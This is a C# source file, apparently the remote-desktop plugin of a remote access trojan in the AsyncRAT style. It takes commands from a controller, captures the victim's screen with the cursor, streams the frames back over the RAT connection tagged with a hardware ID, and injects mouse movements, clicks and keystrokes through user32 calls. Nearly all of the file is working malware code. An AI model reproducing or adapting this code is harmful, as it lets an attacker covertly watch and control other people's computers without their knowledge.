using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using MessagePackLib.MessagePack;
using Plugin.StreamLibrary;
using Plugin.StreamLibrary.UnsafeCodecs;

namespace Plugin
{
    public static class Packet
    {
        private const int CURSOR_SHOWING = 0x00000001;
        public static bool IsOk { get; set; }

        public static void Read(object data)
        {
            var unpack_msgpack = new MsgPack();
            unpack_msgpack.DecodeFromBytes((byte[])data);
            switch (unpack_msgpack.ForcePathObject("Pac_ket").AsString)
            {
                case "remoteDesktop":
                {
                    switch (unpack_msgpack.ForcePathObject("Option").AsString)
                    {
                        case "capture":
                        {
                            if (IsOk) return;
                            IsOk = true;
                            CaptureAndSend(Convert.ToInt32(unpack_msgpack.ForcePathObject("Quality").AsInteger),
                                Convert.ToInt32(unpack_msgpack.ForcePathObject("Screen").AsInteger));
                            break;
                        }

                        case "mouseClick":
                        {
                            //Point position = new Point((Int32)unpack_msgpack.ForcePathObject("X").AsInteger, (Int32)unpack_msgpack.ForcePathObject("Y").AsInteger);
                            //Cursor.Position = position;
                            mouse_event((int)unpack_msgpack.ForcePathObject("Button").AsInteger, 0, 0, 0, 1);
                            break;
                        }

                        case "mouseMove":
                        {
                            var position = new Point((int)unpack_msgpack.ForcePathObject("X").AsInteger,
                                (int)unpack_msgpack.ForcePathObject("Y").AsInteger);
                            Cursor.Position = position;
                            break;
                        }

                        case "stop":
                        {
                            IsOk = false;
                            break;
                        }

                        case "keyboardClick":
                        {
                            var keyDown = Convert.ToBoolean(unpack_msgpack.ForcePathObject("keyIsDown").AsString);
                            var key = Convert.ToByte(unpack_msgpack.ForcePathObject("key").AsInteger);
                            keybd_event(key, 0, keyDown ? 0x0000 : (uint)0x0002, UIntPtr.Zero);
                            break;
                        }
                    }

                    break;
                }
            }
        }

        public static void CaptureAndSend(int quality, int Scrn)
        {
            Bitmap bmp = null;
            BitmapData bmpData = null;
            Rectangle rect;
            Size size;
            MsgPack msgpack;
            IUnsafeCodec unsafeCodec = new UnsafeStreamCodec(quality);
            MemoryStream stream;
            Thread.Sleep(1);
            while (IsOk && Connection.IsConnected)
                try
                {
                    bmp = GetScreen(Scrn);
                    rect = new Rectangle(0, 0, bmp.Width, bmp.Height);
                    size = new Size(bmp.Width, bmp.Height);
                    bmpData = bmp.LockBits(new Rectangle(0, 0, bmp.Width, bmp.Height), ImageLockMode.ReadWrite,
                        bmp.PixelFormat);

                    using (stream = new MemoryStream())
                    {
                        unsafeCodec.CodeImage(bmpData.Scan0, new Rectangle(0, 0, bmpData.Width, bmpData.Height),
                            new Size(bmpData.Width, bmpData.Height), bmpData.PixelFormat, stream);

                        if (stream.Length > 0)
                        {
                            msgpack = new MsgPack();
                            msgpack.ForcePathObject("Pac_ket").AsString = "remoteDesktop";
                            msgpack.ForcePathObject("ID").AsString = Connection.Hwid;
                            msgpack.ForcePathObject("Stream").SetAsBytes(stream.ToArray());
                            msgpack.ForcePathObject("Screens").AsInteger = Convert.ToInt32(Screen.AllScreens.Length);
                            new Thread(() => { Connection.Send(msgpack.Encode2Bytes()); }).Start();
                        }
                    }

                    bmp.UnlockBits(bmpData);
                    bmp.Dispose();
                }
                catch
                {
                    Connection.Disconnected();
                    break;
                }

            try
            {
                IsOk = false;
                bmp?.UnlockBits(bmpData);
                bmp?.Dispose();
                GC.Collect();
            }
            catch
            {
            }
        }

        private static Bitmap GetScreen(int Scrn)
        {
            var rect = Screen.AllScreens[Scrn].Bounds;
            try
            {
                var bmpScreenshot = new Bitmap(rect.Width, rect.Height, PixelFormat.Format32bppArgb);
                using (var graphics = Graphics.FromImage(bmpScreenshot))
                {
                    graphics.CopyFromScreen(rect.Left, rect.Top, 0, 0,
                        new Size(bmpScreenshot.Width, bmpScreenshot.Height), CopyPixelOperation.SourceCopy);
                    CURSORINFO pci;
                    pci.cbSize = Marshal.SizeOf(typeof(CURSORINFO));
                    if (GetCursorInfo(out pci))
                        if (pci.flags == CURSOR_SHOWING)
                        {
                            DrawIcon(graphics.GetHdc(), pci.ptScreenPos.x, pci.ptScreenPos.y, pci.hCursor);
                            graphics.ReleaseHdc();
                        }

                    return bmpScreenshot;
                }
            }
            catch
            {
                return new Bitmap(rect.Width, rect.Height);
            }
        }

        [DllImport("user32.dll")]
        private static extern void mouse_event(int dwFlags, int dx, int dy, uint dwData, int dwExtraInfo);

        [DllImport("user32.dll")]
        internal static extern bool keybd_event(byte bVk, byte bScan, uint dwFlags, UIntPtr dwExtraInfo);

        [DllImport("user32.dll")]
        private static extern bool GetCursorInfo(out CURSORINFO pci);

        [DllImport("user32.dll")]
        private static extern bool DrawIcon(IntPtr hDC, int X, int Y, IntPtr hIcon);

        [StructLayout(LayoutKind.Sequential)]
        private struct CURSORINFO
        {
            public Int32 cbSize;
            public Int32 flags;
            public IntPtr hCursor;
            public POINTAPI ptScreenPos;
        }

        [StructLayout(LayoutKind.Sequential)]
        private struct POINTAPI
        {
            public int x;
            public int y;
        }
    }
}